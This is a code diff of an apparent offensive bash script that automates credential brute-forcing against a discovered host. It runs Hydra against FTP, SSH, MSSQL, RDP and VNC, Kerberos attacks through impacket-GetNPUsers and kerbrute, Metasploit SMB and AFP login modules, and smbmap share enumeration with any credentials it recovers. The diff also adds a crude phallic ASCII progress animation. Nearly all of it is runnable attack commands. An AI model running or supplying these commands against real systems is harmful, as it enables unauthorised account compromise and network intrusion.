@@ -176,7 +176,7 @@ if [[ ! -z "$ftp_svc" ]];then
 
 		echo "===> FTP Open : Few Users , Let's go"
 		bash create_user_password_list.sh > userpass
-		hydra -C userpass -I -V $line ftp | grep "login:" > valid_user_pass_ftp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+		hydra -C userpass -I -V $line ftp | grep "login:" > valid_user_pass_ftp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 		echo ""
 		valid_user_pass_ftp=$(cat valid_user_pass_ftp)
 
@@ -191,10 +191,10 @@ if [[ ! -z "$ftp_svc" ]];then
 		echo "===> FTP Open : Lot of users, are you sure (y/*)"
 		read -t 5 ftpbrute
 
-		if [ "$ftpbrute" == "yes" ];then
+		if [ "$ftpbrute" == "y" ];then
 			bash create_user_password_list.sh > userpass
-			hydra -C userpass -I -V $line ftp | grep "login:" > valid_user_pass_ftp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
-			$valid_user_pass_ftp=$(cat valid_user_pass_ftp)
+			hydra -C userpass -I -V $line ftp | grep "login:" > valid_user_pass_ftp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
+			valid_user_pass_ftp=$(cat valid_user_pass_ftp)
 			
 			if [[ ! -z "$valid_user_pass_ftp" ]];then
 				echo "===> FTP Open : Valid User/Password found :"
@@ -222,12 +222,14 @@ if [[ ! -z "$ssh_svc" ]];then
 	if [ "$nbusers" -lt 80 ]; then 
 		echo "===> SSH Open : Few Users , Let's go"
 		bash create_user_password_list.sh > userpass
-		hydra -C userpass -I -t 4 -V $line ssh | grep "login:"  > valid_user_pass_ssh & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+		hydra -C userpass -I -t 4 -V $line ssh | grep "login:"  > valid_user_pass_ssh & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 		valid_user_pass_ssh=$(cat valid_user_pass_ssh)
 		if [[ ! -z "$valid_user_pass_ssh" ]];then
 			echo "===> SSH Open : Valid SSH User/Password found"
+			echo ""
 			echo "$valid_user_pass_ssh"
 		else 
+			echo ""
 			echo "===> SSH Open : No Valid SSH User/Password found"
 		fi
 
@@ -236,13 +238,14 @@ if [[ ! -z "$ssh_svc" ]];then
 		read -t 5 sshbrute
 		if [ "$sshbrute" == "y" ];then
 			bash create_user_password_list.sh > userpass
-			hydra -C userpass -I -t 4 -V $line ssh | grep "login:" > valid_user_pass_ssh & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+			hydra -C userpass -I -t 4 -V $line ssh | grep "login:" > valid_user_pass_ssh & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 			valid_user_pass_ssh=$(cat valid_user_pass_ssh)
 			if [[ ! -z "$valid_user_pass_ssh" ]];then
-
+				echo ""
 				echo "===> SSH Open : Valid SSH User/Password found"
 				echo "$valid_user_pass_ssh"
 			else 
+				echo ""
 				echo "===> SSH Open : No Valid SSH User/Password found"
 			fi
 
@@ -271,13 +274,21 @@ fi
 
 #KERBEROS
 if [[ ! -z "$kerb_svc" ]];then
+#GetNPUsers
 	echo "===> Kerberos Open : Impacket GetNPUsers "
 	timeout 60 impacket-GetNPUsers -dc-ip $line $url/ -usersfile users  || echo "I failed, perhaps due to time out"
+	
+#Kerbrute
 	echo "===> Kerberos Open : Kerbrute "
 	bash create_user_password_list.sh > userpass
-	valid_user_pass_kerbrute=$(/root/go/bin/kerbrute -d $url bruteforce userpass | grep "VALID LOGIN" | cut -d " " -f 8)
-	echo "$valid_user_pass_kerbrute"
-	echo "$valid_user_pass_kerbrute" > valid_user_pass_kerbrute
+	/root/go/bin/kerbrute -d $url bruteforce userpass | grep "VALID LOGIN" | cut -d " " -f 8 > valid_user_pass_kerbrute & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
+	valid_user_pass_kerbrute=$(cat valid_user_pass_kerbrute)
+	if [[ ! -z "$valid_user_pass_kerbrute" ]];then
+		echo "===> Kerberos Open : Valid User(s)/Password(s) Found"
+		echo "$valid_user_pass_kerbrute"
+	else
+		echo "===> Kerberos Open : No Valid User/Password Found"
+	fi
 else 
 	echo "===> Kerberos Closed"
 fi
@@ -286,22 +297,22 @@ fi
 #bruteforce
 if [[ ! -z "$smb_svc" ]];then
 	echo "===> SMB Open : BF With MSF MODULE SMB_Login (CTRL+C to skip)"
-	msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;" | grep "Success:" | cut -d "'" -f 2 > valid_user_pass_smb & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+	msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;" | grep "Success:" | cut -d "'" -f 2 > valid_user_pass_smb & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 
 	valid_user_pass_smb=$(cat valid_user_pass_smb)
 
 
 #map if user found
 	if [[ ! -z "$valid_user_pass_smb" ]];then
-
-		echo "===> SMB Open : Valid User/Password Found Let's map"
+		echo ""
+		echo "===> SMB Open : Valid User(s)/Password(s) Found Let's map"
 		echo "$valid_user_pass_smb"
 		for validuserpass in $(cat valid_user_pass_smb)
 		do
 			validsmbuser=$(echo $validuserpass | cut -d "\\" -f 2  | cut -d ":" -f 1)
 			echo ""
-			echo "User: $validsmbuser, Pass: "$validsmbuser""
-			smbmap -H $line -u $validsmbuser -p $validsmbuser
+			echo "User: $validsmbuser, Pass: $validsmbuser, Domaine: $url"
+			smbmap -H $line -u $validsmbuser -p $validsmbuser -d $url & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 		done
 	else	
 		echo ""
@@ -315,7 +326,16 @@ fi
 #AFP
 if [[ ! -z "$afp_svc" ]];then
 	echo "===> AFP Open : BF With MSF MODULE AFP_Login"
-	msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;"
+	msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;" | grep "Successful"  | cut -d " " -f 8 > valid_user_pass_afp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
+	valid_user_pass_afp=$(cat valid_user_pass_afp)
+
+	if [[ ! -z "$valid_user_pass_afp" ]];then
+		echo ""
+		echo "===> AFP Open : Valid User(s)/Password(s) Found"
+		echo "$valid_user_pass_afp"
+	else
+		echo "===> AFP Open : No Valid User/Password Found"
+	fi
 else 
 	echo "===> AFP Closed"
 fi
@@ -324,7 +344,7 @@ fi
 if [[ ! -z "$mssql_svc" ]];then
 	echo "===> MSSQL Open : BF With Hydra MSSQL"
 	bash create_user_password_list.sh > userpass
-	hydra -C userpass $line mssql
+	hydra -C userpass $line mssql & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 else 
 	echo "===> MSSQL Closed"
 fi
@@ -333,7 +353,7 @@ fi
 if [[ ! -z "$rdp_svc" ]];then
 	echo "===> RDP Open : BF With Hydra RDP"
 	bash create_user_password_list.sh > userpass
-	hydra -t 1 -V -f -C userpass rdp://$line
+	hydra -t 1 -V -f -C userpass rdp://$line & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 else 
 	echo "===> RDP Closed"
 fi
@@ -345,7 +365,7 @@ if [[ ! -z "$vnc_svc" ]];then
 	if [ "$nbusers" -lt 80 ]; then 
 		echo "===> VNC Open : Few Users , Let's go"
 		bash create_user_password_list.sh > userpass
-		hydra -C userpass -I -V $line vnc
+		hydra -C userpass -I -V $line vnc & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 	else
 		echo "===> VNC Open : Lot of users, are you sure (yes/no)"
 		read -t 5 vncbrute
